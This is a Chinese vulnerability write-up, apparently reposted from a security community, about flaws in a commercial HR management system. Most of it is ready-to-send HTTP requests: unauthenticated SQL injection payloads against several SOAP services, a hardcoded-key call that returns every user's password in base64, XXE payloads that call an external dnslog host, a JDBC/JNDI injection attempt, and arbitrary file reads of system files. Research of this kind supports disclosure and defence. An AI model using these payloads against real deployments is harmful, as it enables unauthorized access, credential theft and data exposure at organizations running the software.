doc/2025/2025-06/2025-W24/2025-06-12/某景人事管理系统漏洞挖掘与分析.md

#  某景人事管理系统漏洞挖掘与分析  
 黑白之道   2025-06-12 02:01  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
  
文章作者：先知社区（tj）  
  
文章来源：  
https://xz.aliyun.com/news/18132  
  
  
**1**  
►  
  
**路由分析/权限认证**  
  
  
web.xml文件，定义了大部分路由，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicR39fsmJqxl3cjB3gzJ5kUe0PsRyJA6n6EAItUknvNMYv5UOWAulNFHg/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic&watermark=1 "")  
  
  
其中存在一个filter，这里的版本比较低，此filter的内容大概是一些访问白名单，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRgS9uqcSp4HpBk5ST9DxibPjsufgZkibFw2vESialLh9yJ1S5zssTsaMLQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
这里会加载seivices.xml的配置，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicR80Hr9jRrz3P33iafOCBu55TlibxjbrewVFLpRTVh2SVicQABiaF9zrxnOA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicROdvnkpKjEEhvC7JHEX5vN3WkGFoGl6pVKJTJslzDT8kFa5xYuia3ZtQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
services.xml，  
XFire是一个Java SOAP框架，  
  
  
service定义了多个service端点，我们就可以访问serviceClass中的公共方法，如：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRPEQod9rgk3PNPRrXiaJpf6IOKTiawsBvxwyWboIDsruxiaLytEpwylCuw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRfBW8BTIeia9OCNK0icNQl4GpkFDdYA9lsmag8A9icLx0Hjaem5htIrtCQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
```
post：
https://xxx/services/HrChangeInfoService
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getChangeUsers>
         <arg0>value1</arg0>
         <arg1>value2'</arg1>
         <arg2>value3'</arg2>
      </hr:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRLhfagCD2SDveBGRvzAp5YtENsxPOozArqBSCZo6fN2qK18dkF78icPw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
struts-config.xml，  
将HTML表单数据与Java对象绑定  
，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRPiba5g7yJIBqEgElXroU5sKlSnpFlmUCsXQF7SJQoCRjUqomLEbREHA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRovqibURsXdu5PeZol6Iqib8O31xD3L6g2PHS2OevVhsCtnLmXmTA4PJQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
type="com.hrms.struts.action.FrameAction"为处理类，其中包含认证逻辑和路由，  
  
  
如：  
https://xxx/performance/solarterms/specialtask.do  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRHxQ7jIg1bkLZWsYWX5pyP8Fe65CMdMK9TBwBuo78sgYAMoJQon6gHw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
filter中给services接口设置了白名单，可以直接访问，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRl3SLHuHZIQVXjSliaYzuhleOFXlcF2QuIJ6IBC1aELI7zeev1rkFickA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicR8CVd5SQ9m7rLFOoxvxX0Ro5Uv06pqhbc9MMBxhJGqaaydqv4RXaXCA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
因此services.xml中的接口都是未授权，  
  
```
post：
https://xxx/services/HrChangeInfoService
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getChangeUsers>
         <arg0>value1</arg0>
         <arg1>value2'</arg1>
         <arg2>value3'</arg2>
      </hr:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRLssJSx6FctxYHIbvaAzlA5NkWuTGIyk5jCIiccTlzHQRDDfdX3Dk3eg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
  
**2**  
►  
  
**前台sql注入services接口（XFire）**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRfic0rEd088U0VrbQjfRIPOmeV71uqG5uwZVNrOgyFwgbuZcjiaZQfLhQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
```
POST /services/HrChangeInfoService HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Cookie: xxx
Content-Length: 392
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getChangeUsers>
         <arg0>
</arg0>
         <arg1>admin';waitfor delay '0:0:10'--</arg1>
         <arg2>1</arg2>
      </hr:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
入口函数getChangeUsers，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRZP4L0GlZVwibianuRicEgHEKRcJN69gOxu9nnjRsia96b9ZNaW7RSIHEjA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
走到sql语句拼接后，经过一系列调用，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRLDqX3iakWuV0WqoTFs615zxWLaFEUib3jUnlbG5I7EbzDPYBMRKXMMiaQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRk7yRw0H2pzplgoZKRVwrgCOHCVRk7CSgUBfTxK0SQPzW8dp3P7MRXQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRcicHtkPbE9pbTvboNKEp1SMp6Vxdr76PoL7RS0YiakG5cSMFnuMBWOWw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRuHkWicHJh3yaXuOoAWE4IIcOqlokhQ0svwb4aAiayQwdDJ6WDnIQfPTg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRYGYLHcx635OBvS9SCNrGnzibXm8WTG9qZKz1hWRKiaDuyNAybvqC8gBQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
之前的sql语句被prepareStatement执行，预编译的sql语句可控，最终造成了sql注入，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRRWmCVdXbhQjxIddvsNyJjN9ib7fOkIEP3FmM0JSv41ibBQvCP7fiasj2g/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
HrpService接口sql注入，  
```
POST /services/HrpService HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Cookie: xxx
Content-Length: 353
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:processResult>
         <arg0>
1);waitfor delay '0:0:5'--
</arg0>
         <arg1></arg1>
      </hr:processResult>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRrdwEia4PGhaVrdEVDibBLJIVtV4Tn78ib8jVqvnIkg3PiaRiaia0WbMXpnOw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
此接口的其他方法也存在sql注入，  
  
```
POST /services/HrpService HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Cookie: xxx
Content-Length: 500
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getHrInfoByID>
         <arg0>
1
</arg0>
        <arg1>
1';waitfor delay '0:0:10'--
</arg1>
        <arg2>
1
</arg2>
        <arg3>
1
</arg3>
        <arg4>
1
</arg4>
        <arg5>
1
</arg5>
        <arg6>
1
</arg6>
      </hr:getHrInfoByID>
   </soapenv:Body>
</soapenv:Envelope>
```  
```

```  
  
HrService接口sql注入，  
```
POST /services/HrService HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Cookie: xxx
Content-Length: 356
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:removeOrganization>
         <arg0>
aaaaaaaaaaaaaaaaaa';waitfor delay '0:0:10'--
</arg0>
      </hr:removeOrganization>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRgZS4shCvqObxvMyoNFcn90UibicRHIs8JnBa9AXbXJUD93YBQzHIxnjw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
services的很多地方存在sql注入，  
```
removeUser、changeUserOrg、validateUserId、getAllOrganizations、getUsersByDeptId、getUsersByOrgId、batchAppend、batchUpdate、batchDelete、
updateEnabled、getCodeIdByCodeDesc、getObjectByParam、isExist、isExecuteSql、initExecuteSql、isProtecting、updateInfoByMap、
batchAppend、batchUpdate、batchDelete、
getKqItem，updateEnabled，isExistOrg、getCodeIdByCodeDesc、isExist，isExecuteSql，................
```  
  
  
**3**  
►  
  
**前台查询所有用户密**  
  
  
**HrpService接口（XFire）**  
  
base64解密得到密码  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRWCTXDBhAZMYkb49xSToBcYGymEEWiaN4k8VemJkia5k1QuESSO4OQXdg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
```
POST /services/HrpService HTTP/1.1
Host: xxx
Cookie: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/xml
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: close
Content-Length: 392
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:getEToken>
         <arg0>
aaa
</arg0>
         <arg1>
c42YFCcwuJdC3uZF9CNUF/kDRn33hWpx
</arg1>
        <arg2>
bjzz</arg2>
      </hr:getEToken>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
  
入口getEToken函数，需要满足checkKey条件，因此传入到第二个参数必须为c42YFCcwuJdC3uZF9CNUF/kDRn33hWpx，  
  
  
UserView var7 = var4.getSetView(var1, "", "false", var6); 会通过我们传入的用户名查询用户所有信息，  
  
  
最终566行返回用户名和密码的base64密文，  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRrnM8q94zjJEJ1vdFWxBPUWicMV1l1HqWnW2JqtHWXZxRhMTJcvOia28w/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRJv40ncwJB4NfTViaiayFvo6JrT9k1u9P24TicLl6E501EJTxLj4fFnQrQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRmtk3cpyHwSsJiah8jiaLcgFhtrwuIFiaxoiayicTl0zLQCDEEMZrSr8w1Vg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
还有任意用户添加接口、查询所有用户接口，  
  
  
HrService-》createUser   getAllUsers  
  
  
  
**4**  
►  
  
**前台xxe**  
  
  
**HrpService接口（XFire）**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicR3ShBAwCTcBeHqyOyiayJkCX1QAIzJ7T5TTHHwMIyoKrichjVLnEuR5ew/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
此接口的其他方法也存在xxe，如getHolidayMsg、impInfoByNotice、getRemainHolidays、syncHolidayMsg、updateHolidays方法，xxe-SynToADService-sendSyncMsg等，doPost(com.hjsj.hrms.servlet.template.OutputTemplateDataServlet)  
  
```
POST /services/HrpService HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Cookie: xxx
Content-Length: 432
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://8b5gf4.dnslog.cn">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:impInfoByNotice>
         <arg0>
<M><syscode>&send;</syscode></M>
</arg0>
      </hr:impInfoByNotice>
   </soapenv:Body>
</soapenv:Envelope>
```  
```

```  
```

```  
```
POST /services/HrpService HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/xml
Cookie: xxx
Content-Length: 434
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://8b5gf4.dnslog.cn">
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrpService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:Huayu_peWageRecv>
         <arg0>
<M><syscode>&send;</syscode></M>
</arg0>
      </hr:Huayu_peWageRecv>
   </soapenv:Body>
</soapenv:Envelope>
```  
  
  
**5**  
►  
  
**jdbc注入**  
  
  
**不存在db2组件，无法getshell**  
  
SynEmpOrgToERPService-》sendSyncMsg  
  
SynToADService-》sendSyncMsg  
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hr:sendSyncMsg>
         <arg0>
<hr>
<jdbc>
         <datatype>
         db2
         </datatype>
         <username>1
        </username>
         <pass>2
        </pass>
         <ip_addr>
         127.0.0.1
         </ip_addr>
         <port>
         5420
         </port>
         <database>
         BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:8811
         </database>
</jdbc>
</hr>
         </arg0>
      </hr:sendSyncMsg>
   </soapenv:Body>
</soapenv:Envelope>
 DriverManager.getConnection("jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1099/evil;");
# jdbc:db2://ip_addr:port/database
```  
  
可以看到getConnection的参数可控，但是此项目没有db2组件，因此getshell失败，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRe6SQyndicjH7oeRYNjk8IH4sgjsJG7fkrWMYsYicQnKFbyla3TvQ8n3w/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRKdibf8zoQp54JZyIzUyjVZKkRjFyUQiaZUgOGjJNCNWLXvwnsDBiaE4lQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**6**  
►  
  
**后台任意文件读取**  
  
  
**/components/fileupload/upload**  
  
com.hjsj.hrms.utils.components.fileupload.servlet.FileUploadServlet  
  
c:/windows/win.ini  
```
POST /components/fileupload/upload HTTP/2
Host: xxx
Cookie: xxx
Content-Length: 137
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Origin: xxx
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: xxx
Accept-Encoding: gzip, deflate, br
Priority: u=4, i
deleteflag=false&down=true&localname=aaa&path=Iy4ZOyMhERcKEEOGPKbbJgPAATTP3HJDPAATTPPAATTP3HJDPAATTP&filename=P2FN5PpfSGUPAATTP3HJDPAATTP
```  
  
/etc/hosts  
```
POST /components/fileupload/upload HTTP/1.1
Host: xxx
Cookie: bosflag=hcm; JSESSIONID=65C5113D881DDF8CE43BC6DC7F2F995A
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://xxx
Accept-Encoding: gzip, deflate, br
Priority: u=1
Connection: keep-alive
Content-Length: 114
deleteflag=false&down=true&localname=sadfasf&path=P7oRbyobcGIPAATTP3HJDPAATTP&filename=rPYRZUSNAfMPAATTP3HJDPAATTP
```  
  
可以看到这里将参数解密后拼接到File中，读取路径可控，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRtTB6YWiafa7mD7wGjXX5Lgl0Pib5s7gofOTA2ib6QyJtw2O19O3m0GOhQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRs8PbrjOXol2en7iafTEICjrNGtpibOSCrPLgpgjZ0iaMmKmib2yfmic0haw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRYttSkq1fPmNPhfjuYLBN97yOpicffa87cB8U6A3nB3ibQs1mJv48zuFw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
加密文件读取路径和文件名，读取服务器的c:/windwos/win.ini，文件读取成功，  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/XoIcX2HtlUBsOG81AqIXbbKJ8ibf7wZicRC5xicWRlbv6XIibRgzeb9euJOQxRw8PGNw7qTbgLicsQUk1M7zlUdliaKg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
